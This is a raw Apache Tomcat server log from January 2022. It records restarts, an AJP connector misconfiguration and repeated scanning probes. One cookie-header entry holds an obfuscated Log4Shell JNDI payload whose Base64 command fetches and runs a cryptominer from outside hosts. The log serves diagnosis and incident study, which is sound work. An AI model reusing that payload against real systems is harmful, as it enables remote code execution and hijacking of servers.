14-Jan-2022 06:56:35.445 SEVERE [Catalina-startStop-2] org.apache.catalina.mapper.MapperListener.findDefaultHost Unknown default host [0.0.0.0] for service [StandardService[Catalina]]. Tomcat will not be able process HTTP/1.0 requests that do not specify a host name.
14-Jan-2022 06:56:35.477 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:56:35.479 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:56:35.480 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:56:35.480 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:56:37.683 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:56:37.686 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:56:37.686 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:56:37.686 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:56:37.687 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:56:37.687 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:56:37.687 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:56:37.687 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:56:37.687 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:56:37.688 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:56:37.688 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:56:37.688 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:56:37.688 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:56:37.689 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:56:37.689 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:56:37.689 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:56:37.694 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:56:37.694 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:56:37.694 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:56:37.694 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:56:37.694 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:56:37.770 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:56:37.784 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:56:37.798 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
14-Jan-2022 06:56:37.800 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:56:37.800 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 710 ms
14-Jan-2022 06:56:37.831 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:56:37.831 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:56:37.841 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:56:38.167 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [325] ms
14-Jan-2022 06:56:38.167 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:56:38.183 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [16] ms
14-Jan-2022 06:56:38.184 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:56:38.449 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [265] ms
14-Jan-2022 06:56:38.450 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:56:38.502 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [52] ms
14-Jan-2022 06:56:38.502 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:56:38.539 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [36] ms
14-Jan-2022 06:56:38.542 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:56:38.550 SEVERE [main] org.apache.catalina.core.StandardService.startInternal Failed to start connector [Connector[AJP/1.3-8009]]
	org.apache.catalina.LifecycleException: Protocol handler start failed
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1101)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:439)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:763)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:688)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
	Caused by: java.lang.IllegalArgumentException: The AJP Connector is configured with secretRequired="true" but the secret attribute is either null or "". This combination is not valid.
		at org.apache.coyote.ajp.AbstractAjpProtocol.start(AbstractAjpProtocol.java:274)
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1099)
		... 12 more
14-Jan-2022 06:56:38.551 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 750 ms
14-Jan-2022 07:40:48.030 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 07:40:48.031 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 07:40:48.038 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
14-Jan-2022 07:40:48.038 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 07:40:48.065 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 07:40:48.067 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 07:40:48.067 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
14-Jan-2022 07:40:48.067 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
14-Jan-2022 07:40:50.538 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 07:40:50.542 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 07:40:50.542 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 07:40:50.543 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 07:40:50.543 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 07:40:50.543 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 07:40:50.543 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 07:40:50.544 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 07:40:50.544 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 07:40:50.544 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 07:40:50.544 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 07:40:50.545 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 07:40:50.545 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 07:40:50.546 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 07:40:50.546 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 07:40:50.547 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 07:40:50.551 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 07:40:50.551 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 07:40:50.551 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 07:40:50.553 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 07:40:50.553 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 07:40:50.661 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 07:40:50.684 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 07:40:50.715 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
14-Jan-2022 07:40:50.716 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 07:40:50.719 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 884 ms
14-Jan-2022 07:40:50.765 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 07:40:50.765 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 07:40:50.775 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 07:40:51.026 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [251] ms
14-Jan-2022 07:40:51.027 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 07:40:51.043 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [16] ms
14-Jan-2022 07:40:51.043 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 07:40:51.318 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [275] ms
14-Jan-2022 07:40:51.318 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 07:40:51.369 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [51] ms
14-Jan-2022 07:40:51.369 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 07:40:51.400 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [31] ms
14-Jan-2022 07:40:51.406 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 07:40:51.419 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
14-Jan-2022 07:40:51.420 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 700 ms
14-Jan-2022 07:41:22.885 SEVERE [ajp-nio-0.0.0.0-8009-exec-1] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [65524]
14-Jan-2022 19:11:30.662 INFO [http-nio-8080-exec-7] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xe30x010x000x000xdf0x030x030xfd0xc5GEs0xafv0x870z0xc40xdaJ0xc10x8a0x140xf70x990xc63N0x940xd20xc00xa90x92$0xd4d0xfbn0xfe0x000x00h0xcc0x140xcc0x130xc0/0xc0+0xc000xc0,0xc00x110xc00x070xc0'0xc0#0xc00x130xc00x090xc0(0xc0$0xc00x140xc00x0a0xcc0x150x000x9e0x000x9f0x00g0x00k0x0030x0090x000x9c0x000x9d0x000x050x000x040x00<0x00=0x00/0x0050xc00x120x000x160x000x0a0x000x030x000x080x000x060x000x140x000x110x000x190x000x170x0020xc00x080x000x120x000x130x000x150x0080x00@0x00f0x00j0x000xa20x000xa30x010x000x00N0x000x000x000x150x000x130x000x000x103.1.171.222:80800x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0c0x000x0a0x040x010x040x030x020x010x020x030x020x020xff0x010x000x010x000x000x0f0x000x010x01...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
14-Jan-2022 19:25:26.543 SEVERE [ajp-nio-0.0.0.0-8009-exec-8] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
15-Jan-2022 03:14:13.822 SEVERE [ajp-nio-0.0.0.0-8009-exec-2] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [23205]
15-Jan-2022 03:59:08.853 SEVERE [ajp-nio-0.0.0.0-8009-exec-4] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
15-Jan-2022 03:59:10.319 SEVERE [ajp-nio-0.0.0.0-8009-exec-5] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
15-Jan-2022 05:55:46.001 SEVERE [ajp-nio-0.0.0.0-8009-exec-7] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
15-Jan-2022 05:55:52.970 SEVERE [ajp-nio-0.0.0.0-8009-exec-10] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
15-Jan-2022 07:02:05.012 SEVERE [ajp-nio-0.0.0.0-8009-exec-9] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
15-Jan-2022 07:02:06.471 SEVERE [ajp-nio-0.0.0.0-8009-exec-10] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
15-Jan-2022 18:07:29.758 INFO [http-nio-8080-exec-1] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x050x010x00...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
15-Jan-2022 22:51:18.374 INFO [http-nio-8080-exec-6] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x03+0x0ev0xd86M0xaa0xbf0xc6]K0x010x92j0x980xa30x020xcb0x100xc90xef0xde0xfc0xb20xd60x050xaf0xab0x86k0xa5P ]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
16-Jan-2022 07:16:16.834 SEVERE [ajp-nio-0.0.0.0-8009-exec-10] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
16-Jan-2022 07:16:18.296 SEVERE [ajp-nio-0.0.0.0-8009-exec-1] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
16-Jan-2022 16:12:48.796 INFO [http-nio-8080-exec-8] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIHd3dzIuZXZhbmRyb2FtYXJhbC5jb206NDQzIC11IGs0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0IC0tdGxz}')] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
16-Jan-2022 23:36:46.077 INFO [http-nio-8080-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x030xa810xc6c_j0xf60xb1L5ms0xa1B:^"0x880x970x930xaf0x9c30xd90x900xbfb0xe30x10Zml ]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
17-Jan-2022 07:53:09.198 INFO [Thread-5] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
17-Jan-2022 07:53:09.213 INFO [Thread-5] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
17-Jan-2022 07:53:09.285 INFO [Thread-5] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
17-Jan-2022 07:53:09.373 INFO [Thread-5] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
17-Jan-2022 07:53:09.386 INFO [Thread-5] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
17-Jan-2022 07:53:09.400 INFO [Thread-5] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
17-Jan-2022 07:53:09.402 INFO [Thread-5] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-0.0.0.0-8009"]
